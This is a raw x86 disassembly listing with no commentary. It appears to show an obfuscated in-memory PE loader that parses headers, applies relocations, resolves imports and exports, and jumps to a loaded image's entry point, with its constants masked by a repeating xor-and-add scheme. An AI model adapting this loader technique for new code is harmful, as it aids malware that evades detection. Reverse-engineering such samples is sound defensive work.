  426ee0:	mov    edx,DWORD PTR [ebp-0x8]
  426ee3:	cmp    edx,eax
  426ee5:	jne    0x426ef6
  426ee7:	mov    eax,DWORD PTR [ebp+0x8]
  426eea:	mov    BYTE PTR [ecx+0x9],0xf
  426eee:	mov    BYTE PTR [eax+0x7],0x56
  426ef2:	mov    BYTE PTR [ecx+0x6],0xe
  426ef6:	mov    BYTE PTR [ecx+0x3],0x1f
  426efa:	leave  
  426efb:	ret    0x4
  426efe:	push   ebp
  426eff:	mov    ebp,esp
  426f01:	push   ecx
  426f02:	push   ecx
  426f03:	lea    eax,[ebp-0x8]
  426f06:	mov    DWORD PTR [ebp-0x4],eax
  426f09:	mov    edx,DWORD PTR [ebp-0x4]
  426f0c:	mov    eax,0x7e0da2f
  426f11:	mov    DWORD PTR [edx],eax
  426f13:	mov    edx,DWORD PTR [ebp-0x8]
  426f16:	cmp    edx,eax
  426f18:	jne    0x426f1e
  426f1a:	mov    BYTE PTR [ecx+0x7],0x56
  426f1e:	mov    eax,DWORD PTR [ebp+0x8]
  426f21:	mov    BYTE PTR [ecx+0x1],0x18
  426f25:	mov    BYTE PTR [eax+0x9],0x2f
  426f29:	leave  
  426f2a:	ret    0x4
  426f2d:	push   ebp
  426f2e:	mov    ebp,esp
  426f30:	push   ecx
  426f31:	push   ecx
  426f32:	lea    eax,[ebp-0x8]
  426f35:	mov    DWORD PTR [ebp-0x4],eax
  426f38:	push   esi
  426f39:	mov    esi,DWORD PTR [ebp-0x4]
  426f3c:	mov    eax,0x7060e3c
  426f41:	mov    DWORD PTR [esi],eax
  426f43:	mov    esi,DWORD PTR [ebp-0x8]
  426f46:	cmp    esi,eax
  426f48:	pop    esi
  426f49:	jne    0x426f55
  426f4b:	mov    BYTE PTR [edx+0x4],0x12
  426f4f:	mov    WORD PTR [ecx+0x3],0x121f
  426f55:	mov    BYTE PTR [edx],0x3e
  426f58:	leave  
  426f59:	ret    
  426f5a:	push   ebp
  426f5b:	mov    ebp,esp
  426f5d:	push   ecx
  426f5e:	push   ecx
  426f5f:	lea    eax,[ebp-0x8]
  426f62:	mov    DWORD PTR [ebp-0x4],eax
  426f65:	mov    edx,DWORD PTR [ebp-0x4]
  426f68:	mov    eax,0xf8870b3f
  426f6d:	mov    DWORD PTR [edx],eax
  426f6f:	mov    edx,DWORD PTR [ebp-0x8]
  426f72:	cmp    edx,eax
  426f74:	jne    0x426f81
  426f76:	mov    eax,DWORD PTR [ebp+0x8]
  426f79:	mov    BYTE PTR [ecx+0x8],0xe
  426f7d:	mov    BYTE PTR [eax+0x1],0x18
  426f81:	mov    BYTE PTR [ecx+0x5],0xa
  426f85:	leave  
  426f86:	ret    0x4
  426f89:	push   esi
  426f8a:	mov    ecx,edi
  426f8c:	call   0x426f5a
  426f91:	mov    edx,edi
  426f93:	mov    ecx,esi
  426f95:	mov    BYTE PTR [esi],0x1e
  426f98:	call   0x426f2d
  426f9d:	push   esi
  426f9e:	mov    ecx,edi
  426fa0:	mov    BYTE PTR [esi+0x5],0xa
  426fa4:	call   0x426efe
  426fa9:	push   esi
  426faa:	mov    BYTE PTR [esi+0x6],0xe
  426fae:	call   0x426ecb
  426fb3:	mov    BYTE PTR [esi+0x2],0x15
  426fb7:	mov    edx,esi
  426fb9:	jmp    0x426e9b
  426fbe:	push   ebp
  426fbf:	mov    ebp,esp
  426fc1:	push   ecx
  426fc2:	mov    ecx,DWORD PTR [edx+0x194]
  426fc8:	push   esi
  426fc9:	mov    esi,DWORD PTR [ebp+0x8]
  426fcc:	mov    esi,DWORD PTR [esi]
  426fce:	mov    DWORD PTR [ecx],esi
  426fd0:	mov    ecx,DWORD PTR [edx+0x194]
  426fd6:	mov    ecx,DWORD PTR [ecx]
  426fd8:	mov    esi,DWORD PTR [edx+0x190]
  426fde:	mov    DWORD PTR [esi],ecx
  426fe0:	mov    eax,DWORD PTR [edx+0x194]
  426fe6:	mov    ecx,DWORD PTR [eax]
  426fe8:	mov    ecx,DWORD PTR [ecx+0x3c]
  426feb:	add    ecx,DWORD PTR [eax]
  426fed:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426ff4:	mov    eax,DWORD PTR [ebp-0x4]
  426ff7:	movzx  ecx,WORD PTR [ecx+0x16]
  426ffb:	xor    eax,0x75108ae
  427000:	add    eax,0x3272f5
  427005:	pop    esi
  427006:	test   ecx,eax
  427008:	je     0x427016
  42700a:	mov    eax,DWORD PTR [edx+0x1c8]
  427010:	mov    DWORD PTR [eax],0xf89c85a2
  427016:	leave  
  427017:	ret    0x4
  42701a:	push   ebp
  42701b:	mov    ebp,esp
  42701d:	sub    esp,0x70
  427020:	and    DWORD PTR [ebp-0x20],0x0
  427024:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42702b:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  427032:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  427039:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  427040:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  427047:	mov    eax,DWORD PTR [ebp+0x20]
  42704a:	mov    eax,DWORD PTR [eax+0x194]
  427050:	mov    DWORD PTR [ebp-0xc],eax
  427053:	mov    eax,DWORD PTR [ebp+0x20]
  427056:	push   ebx
  427057:	push   esi
  427058:	mov    esi,DWORD PTR [eax+0x190]
  42705e:	mov    eax,DWORD PTR [ebp+0x20]
  427061:	mov    eax,DWORD PTR [eax+0x18c]
  427067:	mov    DWORD PTR [ebp-0x8],eax
  42706a:	mov    eax,DWORD PTR [eax]
  42706c:	push   edi
  42706d:	mov    DWORD PTR [ebp-0x4],esi
  427070:	test   eax,eax
  427072:	jne    0x42707f
  427074:	push   DWORD PTR [ebp+0x1c]
  427077:	mov    edx,DWORD PTR [ebp+0x20]
  42707a:	call   0x426fbe
  42707f:	mov    eax,DWORD PTR [esi]
  427081:	mov    ebx,DWORD PTR [esi]
  427083:	add    ebx,DWORD PTR [eax+0x3c]
  427086:	mov    eax,DWORD PTR [ebp+0xc]
  427089:	mov    ecx,DWORD PTR [ebp-0x8]
  42708c:	mov    ecx,DWORD PTR [ecx]
  42708e:	mov    esi,0x75108ae
  427093:	xor    eax,esi
  427095:	mov    edi,0x3272f5
  42709a:	add    eax,edi
  42709c:	cmp    eax,ecx
  42709e:	jne    0x4272d6
  4270a4:	mov    eax,DWORD PTR [ebp-0xc]
  4270a7:	mov    eax,DWORD PTR [eax]
  4270a9:	mov    DWORD PTR [ebp-0x10],eax
  4270ac:	mov    eax,DWORD PTR [ebx+0x50]
  4270af:	mov    DWORD PTR [ebp-0x68],eax
  4270b2:	mov    eax,DWORD PTR [ebp-0x18]
  4270b5:	xor    eax,esi
  4270b7:	add    eax,edi
  4270b9:	mov    DWORD PTR [ebp-0x64],eax
  4270bc:	mov    eax,DWORD PTR [ebp-0x14]
  4270bf:	and    DWORD PTR [ebp-0x6c],0x0
  4270c3:	xor    eax,esi
  4270c5:	add    eax,edi
  4270c7:	mov    DWORD PTR [ebp-0x60],eax
  4270ca:	lea    eax,[ebp-0x70]
  4270cd:	push   eax
  4270ce:	mov    eax,DWORD PTR [ebp+0x8]
  4270d1:	xor    eax,esi
  4270d3:	add    eax,edi
  4270d5:	push   eax
  4270d6:	mov    eax,DWORD PTR [ebp+0x20]
  4270d9:	add    eax,0xaa
  4270de:	push   eax
  4270df:	mov    eax,DWORD PTR [ebp+0x20]
  4270e2:	mov    eax,DWORD PTR [eax+0x198]
  4270e8:	mov    DWORD PTR [ebp-0x70],0x4
  4270ef:	push   DWORD PTR [eax]
  4270f1:	mov    eax,DWORD PTR [ebp+0x10]
  4270f4:	call   eax
  4270f6:	mov    ecx,DWORD PTR [ebp-0xc]
  4270f9:	mov    ecx,DWORD PTR [ecx]
  4270fb:	mov    edx,DWORD PTR [ebp-0x8]
  4270fe:	mov    DWORD PTR [ebp-0x6c],eax
  427101:	mov    DWORD PTR [ebp+0x1c],eax
  427104:	mov    DWORD PTR [edx],ecx
  427106:	mov    ecx,DWORD PTR [ebp-0x4]
  427109:	mov    DWORD PTR [ecx],eax
  42710b:	mov    eax,DWORD PTR [ebx+0x50]
  42710e:	mov    DWORD PTR [ebp-0x68],eax
  427111:	mov    eax,DWORD PTR [ebp-0x1c]
  427114:	xor    eax,esi
  427116:	add    eax,edi
  427118:	mov    DWORD PTR [ebp-0x64],eax
  42711b:	lea    eax,[ebp-0x20]
  42711e:	mov    DWORD PTR [ebp-0x60],eax
  427121:	lea    eax,[ebp-0x70]
  427124:	push   eax
  427125:	mov    eax,DWORD PTR [ebp+0x8]
  427128:	xor    eax,esi
  42712a:	add    eax,edi
  42712c:	push   eax
  42712d:	mov    eax,DWORD PTR [ebp+0x20]
  427130:	add    eax,0xee
  427135:	push   eax
  427136:	mov    eax,DWORD PTR [ebp+0x20]
  427139:	mov    eax,DWORD PTR [eax+0x198]
  42713f:	mov    DWORD PTR [ebp-0x70],0x4
  427146:	push   DWORD PTR [eax]
  427148:	mov    eax,DWORD PTR [ebp+0x10]
  42714b:	call   eax
  42714d:	test   eax,eax
  42714f:	je     0x427174
  427151:	and    DWORD PTR [ebp+0xc],0x0
  427155:	cmp    DWORD PTR [ebx+0x50],0x0
  427159:	jbe    0x427174
  42715b:	mov    eax,DWORD PTR [ebp+0x1c]
  42715e:	mov    ecx,DWORD PTR [ebp-0x10]
  427161:	sub    ecx,eax
  427163:	mov    dl,BYTE PTR [ecx+eax*1]
  427166:	inc    DWORD PTR [ebp+0xc]
  427169:	mov    BYTE PTR [eax],dl
  42716b:	mov    edx,DWORD PTR [ebp+0xc]
  42716e:	inc    eax
  42716f:	cmp    edx,DWORD PTR [ebx+0x50]
  427172:	jb     0x427163
  427174:	mov    edx,DWORD PTR [ebp+0x1c]
  427177:	mov    ecx,DWORD PTR [edx+0x3c]
  42717a:	add    ecx,edx
  42717c:	mov    eax,DWORD PTR [ecx+0xa0]
  427182:	mov    ebx,DWORD PTR [ecx+0x28]
  427185:	add    eax,edx
  427187:	sub    edx,DWORD PTR [ebp-0x10]
  42718a:	add    ebx,DWORD PTR [ebp+0x1c]
  42718d:	mov    DWORD PTR [ebp+0xc],edx
  427190:	mov    DWORD PTR [ebp-0x2c],ecx
  427193:	mov    DWORD PTR [ebp-0x14],ebx
  427196:	mov    DWORD PTR [ebp-0x8],0x0
  42719d:	jmp    0x427219
  42719f:	add    edx,0xfffffff8
  4271a2:	shr    edx,1
  4271a4:	mov    DWORD PTR [ebp-0x18],edx
  4271a7:	je     0x427205
  4271a9:	lea    edx,[eax+0x8]
  4271ac:	mov    DWORD PTR [ebp-0x4],edx
  4271af:	mov    edx,DWORD PTR [ebp-0x18]
  4271b2:	mov    DWORD PTR [ebp-0x18],edx
  4271b5:	mov    edx,DWORD PTR [ebp-0x4]
  4271b8:	movzx  edx,WORD PTR [edx]
  4271bb:	mov    DWORD PTR [ebp-0x24],edx
  4271be:	and    edx,0xfff
  4271c4:	mov    DWORD PTR [ebp-0x28],edx
  4271c7:	mov    edx,DWORD PTR [ebp-0x24]
  4271ca:	shr    edx,0xc
  4271cd:	add    edx,0xffcd8d0b
  4271d3:	xor    edx,esi
  4271d5:	cmp    edx,0xf89c85a0
  4271db:	jne    0x4271fc
  4271dd:	mov    edx,DWORD PTR [ebp-0x28]
  4271e0:	add    edx,DWORD PTR [ebp+0x1c]
  4271e3:	mov    ebx,DWORD PTR [eax]
  4271e5:	cmp    DWORD PTR [ebx+edx*1],0x0
  4271e9:	je     0x4271f9
  4271eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4271ee:	add    ecx,DWORD PTR [ebx+edx*1]
  4271f1:	mov    ebx,DWORD PTR [eax]
  4271f3:	mov    DWORD PTR [edx+ebx*1],ecx
  4271f6:	mov    ecx,DWORD PTR [ebp-0x2c]
  4271f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4271fc:	add    DWORD PTR [ebp-0x4],0x2
  427200:	dec    DWORD PTR [ebp-0x18]
  427203:	jne    0x4271b5
  427205:	mov    edx,DWORD PTR [ebp-0xc]
  427208:	add    DWORD PTR [ebp-0x8],edx
  42720b:	mov    edx,DWORD PTR [ebp-0x8]
  42720e:	cmp    edx,DWORD PTR [ecx+0xa4]
  427214:	jae    0x427227
  427216:	add    eax,DWORD PTR [ebp-0xc]
  427219:	mov    edx,DWORD PTR [eax+0x4]
  42721c:	mov    DWORD PTR [ebp-0xc],edx
  42721f:	test   edx,edx
  427221:	jne    0x42719f
  427227:	mov    eax,DWORD PTR [ebp-0x10]
  42722a:	mov    DWORD PTR [ebp-0x6c],eax
  42722d:	mov    DWORD PTR [ebp-0x70],0x4
  427234:	mov    eax,DWORD PTR [ecx+0x50]
  427237:	mov    DWORD PTR [ebp-0x68],eax
  42723a:	mov    eax,DWORD PTR [ebp-0x1c]
  42723d:	xor    eax,esi
  42723f:	add    eax,edi
  427241:	mov    DWORD PTR [ebp-0x64],eax
  427244:	lea    eax,[ebp-0x20]
  427247:	mov    DWORD PTR [ebp-0x60],eax
  42724a:	lea    eax,[ebp-0x70]
  42724d:	push   eax
  42724e:	mov    eax,DWORD PTR [ebp+0x8]
  427251:	xor    eax,esi
  427253:	add    eax,edi
  427255:	push   eax
  427256:	mov    eax,DWORD PTR [ebp+0x20]
  427259:	add    eax,0xee
  42725e:	push   eax
  42725f:	mov    eax,DWORD PTR [ebp+0x20]
  427262:	mov    eax,DWORD PTR [eax+0x198]
  427268:	push   DWORD PTR [eax]
  42726a:	mov    eax,DWORD PTR [ebp+0x10]
  42726d:	call   eax
  42726f:	mov    eax,DWORD PTR [ebp+0x20]
  427272:	mov    eax,DWORD PTR [eax+0x180]
  427278:	add    eax,DWORD PTR [ebp+0xc]
  42727b:	mov    ecx,DWORD PTR [ebp+0xc]
  42727e:	push   DWORD PTR [ebp+0x18]
  427281:	mov    DWORD PTR [eax],ecx
  427283:	push   DWORD PTR [ebp+0x14]
  427286:	push   DWORD PTR [ebp+0x1c]
  427289:	call   ebx
  42728b:	mov    ecx,DWORD PTR [ebp+0xc]
  42728e:	add    ecx,DWORD PTR [ebp+0x20]
  427291:	lea    eax,[ebp+0x4]
  427294:	mov    DWORD PTR [ebp+0x20],ecx
  427297:	mov    ecx,DWORD PTR [ebp+0x20]
  42729a:	mov    ecx,DWORD PTR [ebp+0x20]
  42729d:	mov    edx,DWORD PTR [ecx+0x190]
  4272a3:	mov    ecx,DWORD PTR [ebp+0x20]
  4272a6:	mov    ecx,DWORD PTR [ecx+0x18c]
  4272ac:	mov    esi,DWORD PTR [ecx]
  4272ae:	cmp    DWORD PTR [eax],esi
  4272b0:	jb     0x4272d1
  4272b2:	mov    esi,DWORD PTR [edx]
  4272b4:	mov    edi,DWORD PTR [edx]
  4272b6:	mov    esi,DWORD PTR [esi+0x3c]
  4272b9:	lea    esi,[edi+esi*1+0x50]
  4272bd:	mov    edi,DWORD PTR [ecx]
  4272bf:	add    edi,DWORD PTR [esi]
  4272c1:	cmp    DWORD PTR [eax],edi
  4272c3:	jae    0x4272d1
  4272c5:	mov    esi,DWORD PTR [ecx]
  4272c7:	mov    ecx,DWORD PTR [eax]
  4272c9:	mov    edx,DWORD PTR [edx]
  4272cb:	sub    ecx,esi
  4272cd:	add    edx,ecx
  4272cf:	mov    DWORD PTR [eax],edx
  4272d1:	mov    eax,DWORD PTR [ebp+0xc]
  4272d4:	jmp    0x4272d8
  4272d6:	xor    eax,eax
  4272d8:	pop    edi
  4272d9:	pop    esi
  4272da:	pop    ebx
  4272db:	leave  
  4272dc:	ret    0x1c
  4272df:	push   ebp
  4272e0:	mov    ebp,esp
  4272e2:	sub    esp,0x1c
  4272e5:	push   esi
  4272e6:	mov    esi,eax
  4272e8:	mov    eax,DWORD PTR [ecx+0x190]
  4272ee:	cmp    DWORD PTR [eax],0x0
  4272f1:	je     0x427401
  4272f7:	test   edx,edx
  4272f9:	je     0x427401
  4272ff:	test   esi,esi
  427301:	je     0x427401
  427307:	mov    eax,DWORD PTR [esi+0x88]
  42730d:	test   eax,eax
  42730f:	je     0x4273fc
  427315:	cmp    DWORD PTR [esi+0x8c],0x10
  42731c:	je     0x4273fc
  427322:	cmp    DWORD PTR [esi+0x34],edx
  427325:	je     0x4273fc
  42732b:	mov    esi,DWORD PTR [ecx+0x18c]
  427331:	and    DWORD PTR [ebp-0x10],0x0
  427335:	mov    ecx,edx
  427337:	sub    ecx,DWORD PTR [esi]
  427339:	add    eax,edx
  42733b:	movzx  edx,WORD PTR [eax+0xc]
  42733f:	mov    DWORD PTR [ebp-0x1c],ecx
  427342:	movzx  ecx,WORD PTR [eax+0xe]
  427346:	add    ecx,edx
  427348:	je     0x4273fc
  42734e:	lea    ecx,[eax+0x14]
  427351:	push   ebx
  427352:	mov    DWORD PTR [ebp-0x18],ecx
  427355:	mov    esi,0x7fffffff
  42735a:	push   edi
  42735b:	test   DWORD PTR [ecx],esi
  42735d:	je     0x4273de
  42735f:	mov    edx,DWORD PTR [ecx]
  427361:	and    DWORD PTR [ebp-0xc],0x0
  427365:	and    edx,esi
  427367:	add    edx,eax
  427369:	movzx  edi,WORD PTR [edx+0xe]
  42736d:	movzx  ebx,WORD PTR [edx+0xc]
  427371:	add    edi,ebx
  427373:	je     0x4273de
  427375:	lea    ecx,[edx+0x14]
  427378:	mov    DWORD PTR [ebp-0x14],ecx
  42737b:	test   DWORD PTR [ecx],esi
  42737d:	je     0x4273c0
  42737f:	mov    ecx,DWORD PTR [ecx]
  427381:	and    DWORD PTR [ebp-0x8],0x0
  427385:	and    ecx,esi
  427387:	add    ecx,eax
  427389:	movzx  edi,WORD PTR [ecx+0xe]
  42738d:	movzx  ebx,WORD PTR [ecx+0xc]
  427391:	add    edi,ebx
  427393:	je     0x4273c0
  427395:	lea    edi,[ecx+0x14]
  427398:	mov    DWORD PTR [ebp-0x4],edi
  42739b:	mov    edi,DWORD PTR [ebp-0x4]
  42739e:	mov    edi,DWORD PTR [edi]
  4273a0:	test   edi,edi
  4273a2:	je     0x4273aa
  4273a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4273a7:	add    DWORD PTR [edi+eax*1],ebx
  4273aa:	movzx  edi,WORD PTR [ecx+0xe]
  4273ae:	movzx  ebx,WORD PTR [ecx+0xc]
  4273b2:	inc    DWORD PTR [ebp-0x8]
  4273b5:	add    DWORD PTR [ebp-0x4],0x8
  4273b9:	add    edi,ebx
  4273bb:	cmp    DWORD PTR [ebp-0x8],edi
  4273be:	jb     0x42739b
  4273c0:	movzx  edi,WORD PTR [edx+0xe]
  4273c4:	movzx  ebx,WORD PTR [edx+0xc]
  4273c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4273cb:	inc    DWORD PTR [ebp-0xc]
  4273ce:	add    ecx,0x8
  4273d1:	add    edi,ebx
  4273d3:	mov    DWORD PTR [ebp-0x14],ecx
  4273d6:	cmp    DWORD PTR [ebp-0xc],edi
  4273d9:	jb     0x42737b
  4273db:	mov    ecx,DWORD PTR [ebp-0x18]
  4273de:	movzx  edx,WORD PTR [eax+0xe]
  4273e2:	movzx  edi,WORD PTR [eax+0xc]
  4273e6:	inc    DWORD PTR [ebp-0x10]
  4273e9:	add    ecx,0x8
  4273ec:	add    edx,edi
  4273ee:	mov    DWORD PTR [ebp-0x18],ecx
  4273f1:	cmp    DWORD PTR [ebp-0x10],edx
  4273f4:	jb     0x42735b
  4273fa:	pop    edi
  4273fb:	pop    ebx
  4273fc:	xor    eax,eax
  4273fe:	inc    eax
  4273ff:	jmp    0x427403
  427401:	xor    eax,eax
  427403:	pop    esi
  427404:	leave  
  427405:	ret    
  427406:	push   ebp
  427407:	mov    ebp,esp
  427409:	mov    ecx,DWORD PTR [ecx+0x190]
  42740f:	mov    eax,DWORD PTR [ebp+0xc]
  427412:	sub    esp,0x10
  427415:	push   ebx
  427416:	xor    ebx,ebx
  427418:	push   esi
  427419:	push   edi
  42741a:	cmp    DWORD PTR [ecx],ebx
  42741c:	je     0x4274a4
  427422:	cmp    eax,ebx
  427424:	je     0x4274a4
  427426:	cmp    DWORD PTR [eax+0x78],ebx
  427429:	jne    0x427430
  42742b:	xor    eax,eax
  42742d:	inc    eax
  42742e:	jmp    0x4274a6
  427430:	mov    eax,DWORD PTR [eax+0x78]
  427433:	add    eax,DWORD PTR [ebp+0x8]
  427436:	mov    ecx,DWORD PTR [eax+0x1c]
  427439:	mov    edx,DWORD PTR [eax+0x24]
  42743c:	mov    esi,DWORD PTR [eax+0x14]
  42743f:	mov    edi,DWORD PTR [eax+0x18]
  427442:	add    ecx,DWORD PTR [ebp+0x8]
  427445:	add    edx,DWORD PTR [ebp+0x8]
  427448:	mov    DWORD PTR [ebp-0x4],esi
  42744b:	cmp    esi,edi
  42744d:	ja     0x427452
  42744f:	mov    DWORD PTR [ebp-0x4],edi
  427452:	mov    DWORD PTR [ebp-0x8],ebx
  427455:	cmp    DWORD PTR [ebp-0x4],ebx
  427458:	jbe    0x42742b
  42745a:	cmp    ebx,DWORD PTR [eax+0x14]
  42745d:	jae    0x427465
  42745f:	movzx  esi,WORD PTR [edx+ebx*2]
  427463:	jmp    0x427467
  427465:	mov    esi,ebx
  427467:	lea    esi,[ecx+esi*4]
  42746a:	mov    edi,DWORD PTR [esi]
  42746c:	test   edi,edi
  42746e:	je     0x427499
  427470:	add    edi,DWORD PTR [ebp+0x8]
  427473:	mov    DWORD PTR [ebp-0x10],edi
  427476:	cmp    edi,eax
  427478:	jbe    0x42748a
  42747a:	mov    ebx,DWORD PTR [ebp+0xc]
  42747d:	mov    ebx,DWORD PTR [ebx+0x7c]
  427480:	add    ebx,eax
  427482:	cmp    edi,ebx
  427484:	jae    0x42748a
  427486:	mov    esi,DWORD PTR [esi]
  427488:	jmp    0x427492
  42748a:	sub    edi,DWORD PTR [ebp+0x8]
  42748d:	mov    DWORD PTR [esi],edi
  42748f:	mov    esi,DWORD PTR [ebp-0x10]
  427492:	test   esi,esi
  427494:	je     0x4274a4
  427496:	mov    ebx,DWORD PTR [ebp-0x8]
  427499:	inc    ebx
  42749a:	mov    DWORD PTR [ebp-0x8],ebx
  42749d:	cmp    ebx,DWORD PTR [ebp-0x4]
  4274a0:	jb     0x42745a
  4274a2:	jmp    0x42742b
  4274a4:	xor    eax,eax
  4274a6:	pop    edi
  4274a7:	pop    esi
  4274a8:	pop    ebx
  4274a9:	leave  
  4274aa:	ret    0x8
  4274ad:	push   ebp
  4274ae:	mov    ebp,esp
  4274b0:	sub    esp,0x2c
  4274b3:	mov    edx,0xf89c85a5
  4274b8:	mov    DWORD PTR [ebp-0x4],edx
  4274bb:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4274c2:	mov    eax,DWORD PTR [ebp-0x4]
  4274c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274c8:	mov    ecx,DWORD PTR [ebp-0x4]
  4274cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4274ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4274d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4274d4:	push   ebx
  4274d5:	mov    ebx,DWORD PTR [ebp+0x10]
  4274d8:	push   esi
  4274d9:	mov    esi,0x75108ae
  4274de:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  4274e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274e8:	mov    ebx,DWORD PTR [ebx+0x190]
  4274ee:	push   edi
  4274ef:	mov    edi,0x3272f5
  4274f4:	xor    ecx,esi
  4274f6:	xor    eax,esi
  4274f8:	add    eax,edi
  4274fa:	add    ecx,edi
  4274fc:	mov    DWORD PTR [ebp-0x18],eax
  4274ff:	cmp    ecx,DWORD PTR [ebx]
  427501:	je     0x427782
  427507:	mov    ebx,DWORD PTR [ebp-0x4]
  42750a:	mov    ecx,DWORD PTR [ebp+0xc]
  42750d:	xor    ebx,esi
  42750f:	add    ebx,edi
  427511:	cmp    ebx,ecx
  427513:	je     0x427782
  427519:	mov    ebx,DWORD PTR [ebp-0x4]
  42751c:	mov    ecx,DWORD PTR [ecx+0x80]
  427522:	xor    ebx,esi
  427524:	add    ebx,edi
  427526:	cmp    ecx,ebx
  427528:	je     0x42777d
  42752e:	add    ecx,DWORD PTR [ebp+0x8]
  427531:	mov    DWORD PTR [ebp-0x2c],ecx
  427534:	mov    ebx,edx
  427536:	xor    ebx,esi
  427538:	add    ebx,edi
  42753a:	mov    DWORD PTR [ebp-0x10],ebx
  42753d:	mov    ebx,DWORD PTR [ebp-0x10]
  427540:	cmp    ebx,edx
  427542:	je     0x427556
  427544:	mov    edx,DWORD PTR [ebp-0x10]
  427547:	mov    ebx,DWORD PTR [ebp-0x4]
  42754a:	imul   edx,edx,0x14
  42754d:	xor    ebx,esi
  42754f:	add    ebx,edi
  427551:	cmp    DWORD PTR [edx+ecx*1],ebx
  427554:	jne    0x42756d
  427556:	mov    edx,DWORD PTR [ebp-0x10]
  427559:	mov    ebx,DWORD PTR [ebp-0x4]
  42755c:	imul   edx,edx,0x14
  42755f:	xor    ebx,esi
  427561:	add    ebx,edi
  427563:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  427567:	je     0x42776f
  42756d:	mov    eax,DWORD PTR [ebp-0x4]
  427570:	mov    ebx,DWORD PTR [ebp-0x4]
  427573:	mov    eax,DWORD PTR [ebp-0x10]
  427576:	imul   eax,eax,0x14
  427579:	add    eax,ecx
  42757b:	mov    ecx,DWORD PTR [eax+0x10]
  42757e:	add    ecx,DWORD PTR [ebp+0x8]
  427581:	xor    ebx,esi
  427583:	mov    DWORD PTR [ebp-0x1c],ecx
  427586:	mov    ecx,DWORD PTR [ebp-0x4]
  427589:	mov    edx,DWORD PTR [ebp-0x4]
  42758c:	xor    ecx,esi
  42758e:	add    ecx,edi
  427590:	xor    edx,esi
  427592:	mov    DWORD PTR [ebp-0x24],ecx
  427595:	mov    ecx,DWORD PTR [eax]
  427597:	add    edx,edi
  427599:	add    ebx,edi
  42759b:	cmp    ecx,edx
  42759d:	je     0x4275a5
  42759f:	add    ecx,DWORD PTR [ebp+0x8]
  4275a2:	mov    DWORD PTR [ebp-0x24],ecx
  4275a5:	mov    ecx,DWORD PTR [ebp-0x4]
  4275a8:	xor    ecx,esi
  4275aa:	add    ecx,DWORD PTR [eax+0xc]
  4275ad:	mov    eax,DWORD PTR [ebp+0x8]
  4275b0:	lea    eax,[ecx+eax*1+0x3272f5]
  4275b7:	mov    DWORD PTR [ebp+0xc],eax
  4275ba:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4275c1:	mov    eax,DWORD PTR [ebp+0x10]
  4275c4:	push   DWORD PTR [ebp+0xc]
  4275c7:	mov    eax,DWORD PTR [eax+0x1e0]
  4275cd:	call   DWORD PTR [eax]
  4275cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4275d2:	xor    ecx,esi
  4275d4:	add    ecx,edi
  4275d6:	mov    DWORD PTR [ebp-0xc],eax
  4275d9:	cmp    ecx,eax
  4275db:	jne    0x4275ef
  4275dd:	mov    eax,DWORD PTR [ebp+0x10]
  4275e0:	push   DWORD PTR [ebp+0xc]
  4275e3:	mov    eax,DWORD PTR [eax+0x1e0]
  4275e9:	call   DWORD PTR [eax+0xc]
  4275ec:	mov    DWORD PTR [ebp-0xc],eax
  4275ef:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  4275f6:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  4275fd:	mov    eax,DWORD PTR [ebp-0x4]
  427600:	xor    eax,esi
  427602:	add    eax,edi
  427604:	cmp    eax,DWORD PTR [ebp-0xc]
  427607:	jne    0x42762c
  427609:	mov    eax,DWORD PTR [ebp-0x8]
  42760c:	mov    ecx,DWORD PTR [ebp-0x20]
  42760f:	xor    eax,esi
  427611:	xor    ecx,esi
  427613:	lea    ebx,[ebx+eax*1+0x3272f5]
  42761a:	mov    eax,DWORD PTR [ebp+0x10]
  42761d:	mov    eax,DWORD PTR [eax+0x1e0]
  427623:	add    ecx,edi
  427625:	imul   ecx,ebx
  427628:	push   ecx
  427629:	call   DWORD PTR [eax+0x24]
  42762c:	mov    eax,DWORD PTR [ebp-0x4]
  42762f:	xor    eax,esi
  427631:	add    eax,edi
  427633:	cmp    eax,DWORD PTR [ebp-0xc]
  427636:	jne    0x427647
  427638:	mov    eax,DWORD PTR [ebp-0x28]
  42763b:	xor    eax,esi
  42763d:	add    eax,edi
  42763f:	cmp    ebx,eax
  427641:	jbe    0x4275c1
  427647:	mov    eax,DWORD PTR [ebp-0x4]
  42764a:	xor    eax,esi
  42764c:	add    eax,edi
  42764e:	cmp    eax,DWORD PTR [ebp-0xc]
  427651:	jne    0x42766a
  427653:	mov    eax,DWORD PTR [ebp-0x8]
  427656:	mov    ecx,DWORD PTR [ebp-0x18]
  427659:	xor    eax,esi
  42765b:	lea    eax,[ecx+eax*1+0x3272f5]
  427662:	mov    DWORD PTR [ebp-0x18],eax
  427665:	jmp    0x427759
  42766a:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427671:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  427678:	mov    ebx,DWORD PTR [ebp-0x4]
  42767b:	xor    ebx,esi
  42767d:	add    ebx,edi
  42767f:	jmp    0x427746
  427684:	mov    eax,DWORD PTR [ebp-0x4]
  427687:	xor    eax,esi
  427689:	add    eax,edi
  42768b:	mov    DWORD PTR [ebp-0x14],eax
  42768e:	mov    eax,DWORD PTR [ebp-0x4]
  427691:	xor    eax,esi
  427693:	add    eax,edi
  427695:	mov    DWORD PTR [ebp+0xc],eax
  427698:	mov    ecx,DWORD PTR [ebp-0x4]
  42769b:	mov    eax,DWORD PTR [ebp-0x24]
  42769e:	xor    ecx,esi
  4276a0:	add    ecx,edi
